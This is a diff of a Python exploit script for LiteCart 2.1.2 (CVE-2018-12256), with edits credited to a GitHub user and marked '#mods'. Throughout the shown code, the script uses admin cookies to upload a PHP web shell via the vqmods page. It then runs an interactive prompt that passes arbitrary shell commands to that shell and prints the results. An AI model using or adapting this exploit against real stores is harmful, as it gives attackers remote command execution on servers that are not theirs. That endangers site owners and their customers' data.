@@ -2,12 +2,17 @@
 # Software Link: https://www.litecart.net/downloading?version=2.1.2
 # Version: 2.1.2
 # CVE : CVE-2018-12256
- 
-#!/usr/bin/env python
-import mechanize, cookielib, urllib2, requests, sys, argparse, random, string
 
-from cmd import Cmd
-pooner = open('poone.php', 'r')
+
+# Mods by github.com/p4yl0ad 
+# "mods" , denotes modified content from the original script
+
+
+#!/usr/bin/env python
+import mechanize, cookielib, urllib2, requests, sys, argparse, random, string #mods
+
+from cmd import Cmd #mods 
+pooner = open('poone.php', 'r') #mods 
 
 parser = argparse.ArgumentParser(description='LiteCart')
 parser.add_argument('-t',
@@ -57,36 +62,36 @@ files = {
 
 
 #mods by github.com/p4yl0ad
-r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id")
+r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id") #mods
 
-if r.status_code == 200:
-    print r.content
-    print "starting cmdloop big boi, get that w00t"
+if r.status_code == 200: #mods
+    print r.content #mods
+    print "starting cmdloop big boi, get that w00t" #mods
    
-if r.status_code == 404:
-    print "file not found, uploading to target"
-    response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
-    r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id")
-else:
+if r.status_code == 404: #mods
+    print "file not found, uploading to target" #mods
+    response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict) #mods
+    r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id") #mods
+else: 
     print "Sorry something went wrong"
 
 
 
 
 
-class loop(Cmd):
-    prompt="ayylmao > "
-    def default(self, params):
-        cmd_response = self.getfuktm8(params)
-        print(cmd_response)
+class loop(Cmd): #mods
+    prompt="ayylmao > " #mods
+    def default(self, params): #mods
+        cmd_response = self.getfuktm8(params) #mods
+        print(cmd_response) #mods
 
-    def getfuktm8(self, cmd_response):
-        target = url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=" + cmd_response
-        cmd_response = requests.get(target)
-        try:
-            if cmd_response.status_code == 200:
-                return cmd_response.content
-        except:
-            return None
+    def getfuktm8(self, cmd_response): #mods
+        target = url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=" + cmd_response #mods
+        cmd_response = requests.get(target) #mods
+        try: #mods
+            if cmd_response.status_code == 200: #mods
+                return cmd_response.content #mods
+        except: #mods
+            return None #mods
 
-loop().cmdloop()
+loop().cmdloop() #mods
